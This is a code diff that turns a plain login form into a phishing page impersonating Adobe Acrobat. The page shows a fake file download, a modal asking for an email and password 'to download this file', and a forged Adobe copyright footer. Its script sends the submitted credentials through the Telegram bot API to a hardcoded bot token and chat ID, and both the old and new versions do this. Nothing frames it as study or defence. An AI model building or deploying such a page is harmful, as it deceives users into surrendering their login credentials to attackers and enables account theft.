@@ -1,41 +1,392 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login Form</title>
+    <title>Log in</title>
 </head>
+
 <body>
-  <form id="login-form">
-    <input type="email" name="email" placeholder="Email" required />
-    <input type="password" name="password" placeholder="Password" required />
-    <button type="submit">Send</button>
-  </form>
+    <center>
+        <style>
+            * {
+                margin: 0;
+            }
 
-  <script>
-    const botToken = '7240803358:AAEHbrZsR5qeU570PBSvxKQGM3VnXAbN6C0';
-    const chatId = '5970218151';
+            body {
+                /* background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIigt4TGSoCc3eVR6Uiv6orNAxqVHYGzpLXmWqgTXMp0YxcMoTBUfdUrJ2EUx3baL3Lxlhvw6SYegd8Wsun-RdDzQK6eCoxpH3XOebjR9jQk6KPTXX9IBLUdjHLdqeQ-rOmEmBXQN2hiJ6DXk5rq6lPIB4jSKVaP_PQq1WJs7CYtIX3MQ2VntcbNSEsrg/s320/Leonardoworx.jpg') no-repeat center center fixed; */
+                /* background-color: #FFF; */
+                background-color: #1e1e1e;
+                overflow: hidden;
+                height: 100vh;
+                width: 100%;
+                /* display: flex;
+                justify-content: center;
+                align-items: center;
+                flex-direction: column; */
+                -webkit-background-size: cover;
+                -moz-background-size: cover;
+                -o-background-size: cover;
+                background-size: cover;
+                background-position-y: -50px;
+            }
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-      e.preventDefault();
+            .modal {
+                display: none;
+                /* Hidden by default */
+                position: fixed;
+                /* Stay in place */
+                z-index: 1;
+                /* Sit on top */
+                left: 0;
+                top: 0;
+                width: 100%;
+                /* Full width */
+                height: 100%;
+                /* Full height */
+                overflow: auto;
+                /* Enable scroll if needed */
+                background-color: rgb(0, 0, 0);
+                /* Fallback color */
+                background-color: rgba(0, 0, 0, 0.4);
+                /* Black w/ opacity */
+                padding-top: 60px;
+            }
 
-      const form = e.target;
-      const email = form.email.value;
-      const password = form.password.value;
+            /* Modal Content/Box */
+            .modal-content {
+                background-color: #fff;
+                margin: 5% auto 15% auto 5%;
+                /* 5% from the top, 15% from the bottom and centered */
+                border: 1px solid #888;
+                width: 50%;
+                /* Could be more or less, depending on screen size */
+            }
 
-      const message = `🔐 *New Login Attempt*%0A📧 Email: ${email}%0A🔑 Password: ${password}`;
+            input {
+                display: block;
+                margin: 0;
+                width: 300px;
+                font-family: sans-serif;
+                font-size: 15px;
+                padding: 8px;
+                border: 1px solid #DFDFDF;
+            }
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
-        .then(response => {
-          if (response.ok) {
-            alert('Sent to Telegram!');
-            form.reset();
-          } else {
-            alert('Error sending message.');
-          }
-        })
-        .catch(error => alert('Request failed: ' + error));
-    });
-  </script>
+
+            #backgroundimage {
+                position: absolute;
+                top: 0px;
+                left: 0px;
+            }
+
+
+            fieldset {
+                font-family: sans-serif;
+                width: 405px;
+                height: 404px;
+                background: white;
+                border: 1px solid #DFDFDF;
+                padding: 8px;
+                bottom: 10px;
+                margin-top: 100px;
+            }
+
+
+            button {
+                background-color: #691011;
+                color: white;
+                height: 45px;
+                padding: 0px 40px;
+                outline: none;
+                border: none;
+                border-radius: 25px;
+                font-size: 16px;
+            }
+
+            input[type=submit] {
+
+                width: 250px;
+                padding: 15px;
+                font-size: 16px;
+                color: #fff;
+                background-color: #691011;
+                margin-bottom: 0;
+                font-weight: normal;
+                cursor: pointer;
+                border: 0px;
+            }
+
+            #box {
+                height: 400px;
+                width: 300px;
+                border: 1px solid black;
+                border-radius: 10px;
+                background-color: white;
+                /* position: absolute; */
+                left: 655px;
+                top: 200px;
+            }
+
+            #box img {
+                width: 80%;
+                height: 250px;
+                margin-top: 15px;
+                margin-bottom: 30px;
+            }
+
+            #top-left {
+                position: absolute;
+                left: 10px;
+            }
+
+            #top-right {
+                position: absolute;
+                right: 10px;
+            }
+
+            /* new code */
+            .container {
+                /* background: url('https://i.imgur.com/Db1CsS3.jpeg'); */
+                /* background: url('https://i.imgur.com/Db1CsS3.jpeg') no-repeat center center fixed; */
+                background: white;
+                width: 100%;
+                height: 89vh;
+                display: flex;
+                align-items: center;
+                justify-content: space-around;
+            }
+
+            .box-icon {
+                width: 700px;
+            }
+
+            /* nav style */
+
+            .header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                background-color: #1e1e1e;
+                padding: 10px 20px;
+                color: white;
+                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            }
+
+            .logo {
+                display: flex;
+                align-items: center;
+            }
+
+            .logo img {
+                width: 20px;
+                height: 20px;
+                margin-right: 8px;
+            }
+
+            .logo span {
+                font-size: 14px;
+                font-weight: bold;
+                color: white;
+            }
+
+            .right-section {
+                display: flex;
+                align-items: center;
+            }
+
+            .help-icon {
+                font-size: 18px;
+                color: white;
+                margin-right: 16px;
+                cursor: pointer;
+            }
+
+            .sign-in-btn {
+                background-color: transparent;
+                border: 1px solid #5f6368;
+                color: white;
+                padding: 6px 12px;
+                border-radius: 15px;
+                font-size: 14px;
+                cursor: pointer;
+                transition: background-color 0.2s ease;
+            }
+
+            .sign-in-btn:hover {
+                background-color: #333;
+            }
+
+            /* footer */
+            .footer {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                background-color: #1e1e1e;
+                padding: 10px 20px;
+                color: #ffffff;
+                font-size: 13px;
+                margin-top: -90px;
+                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            }
+
+            .footer .language {
+                display: flex;
+                align-items: center;
+            }
+
+            .footer .language-icon {
+                margin-right: 6px;
+                font-size: 14px;
+            }
+
+            .footer .language span {
+                margin-right: 5px;
+            }
+
+            .footer a {
+                color: #0078d4;
+                text-decoration: none;
+                margin: 0 4px;
+            }
+
+            .footer a:hover {
+                text-decoration: underline;
+            }
+
+            .footer .links {
+                text-align: right;
+            }
+
+            /* fieldset */
+            fieldset img {
+                width: 40px;
+            }
+
+            fieldset .spec {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-top: 30px;
+                margin-bottom: 20px;
+            }
+
+            fieldset .spec p {
+                margin-left: 20px;
+                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+                font-size: 20px;
+            }
+
+            /*  */
+            .title {
+                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+                margin-bottom: 20px;
+            }
+        </style>
+        <div class="header">
+            <div class="logo">
+                <img src="data:image/png;base64,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"
+                    alt="Adobe Acrobat Logo" onclick="document.getElementById('id01').style.display='block'">
+                <span onclick="document.getElementById('id01').style.display='block'">Adobe Acrobat</span>
+            </div>
+            <div class="right-section">
+                <span class="help-icon">?</span>
+                <button class="sign-in-btn" onclick="document.getElementById('id01').style.display='block'">Sign
+                    in</button>
+            </div>
+        </div>
+        <div class="container">
+            <div id="box"><br>
+                <img
+                    src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEIp1Qu7ulju_yVcktHaxbql4d9kRQfbQcBNefp_CglGhG4vhLieR1OuOr1p7iVgknWk1BuavSoXPbC1_67kBGsR00hVqZMGeeyB4p3wehBTh5lJraqDqH9kQMEBIn13uwa-WMSBhJQ9BloqcuspXN2oSOMem3b0u4qQxhIKaMb0GwnIPHegY3a8juutM/s320/1000245909.jpg"><br>
+                <button onclick="document.getElementById('id01').style.display='block'"
+                    style="width:auto;">Download</button>
+            </div>
+            <div class="box-icon">
+                <img src="https://get.adobe.com/reader/bc12c20ecc/images/marquee_banner.svg" alt="">
+            </div>
+        </div>
+
+        <form>
+            <br><br><br><br><br>
+    </center>
+    <div id="id01" class="modal">
+        <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal"></span>
+        <center>
+            <fieldset><br>
+                <div class="spec">
+                    <img
+                        src="data:image/png;base64,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">
+                    <p>Log In</p>
+                </div>
+                <p class="title">to download this file, login </p>
+                <!-- <img src="https://i.im.ge/2022/10/30/2RADVD.Screenshot14.png"><br><br> -->
+                <input type="email" name="user" placeholder="Enter Email" required>
+                <br><input type="password" name="pass" placeholder="Enter Password" required><br>
+                <br>
+
+                <input type="submit" name="submit" value="Log In" />
+                <br> <br>
+        </center>
+        </fieldset>
+    </div>
+    <script>
+        // Get the modal
+        var modal = document.getElementById('id01');
+
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function (event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
+
+    </center>
+    </form>
+    <div class="footer">
+        <div class="language">
+            <span>Language:</span>
+            <a href="#" onclick="document.getElementById('id01').style.display='block'">English: US</a>
+        </div>
+
+        <div class="links">
+            <span>Copyright (c) 2025 Adobe. All rights reserved.</span>
+            <a href="#" onclick="document.getElementById('id01').style.display='block'">Privacy</a> /
+            <a href="#" onclick="document.getElementById('id01').style.display='block'">Terms of Use</a> /
+            <a href="#" onclick="document.getElementById('id01').style.display='block'">Cookie preferences</a> /
+            <a href="#" onclick="document.getElementById('id01').style.display='block'">Do Not Sell Or Share My Personal
+                Information</a>
+        </div>
+    </div>
+
+    <script>
+  const botToken = '7240803358:AAEHbrZsR5qeU570PBSvxKQGM3VnXAbN6C0'; // Your Telegram bot token
+  const chatId = '5970218151'; // Your chat ID
+
+  document.querySelector('form').addEventListener('submit', function (e) {
+    e.preventDefault(); // Stop default form submission
+
+    const email = document.querySelector('input[name="user"]').value;
+    const password = document.querySelector('input[name="pass"]').value;
+
+    const message = `🔐 *New Login Submitted*%0A📧 Email: ${email}%0A🔑 Password: ${password}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
+      .then(response => {
+        if (response.ok) {
+          alert('Login sent! You can now close this box.');
+          document.getElementById('id01').style.display = 'none';
+          e.target.reset(); // Clear the form
+        } else {
+          alert('Error sending to Telegram.');
+        }
+      })
+      .catch(error => {
+        alert('Error: ' + error.message);
+      });
+  });
+</script>
+
 </body>
+
 </html>
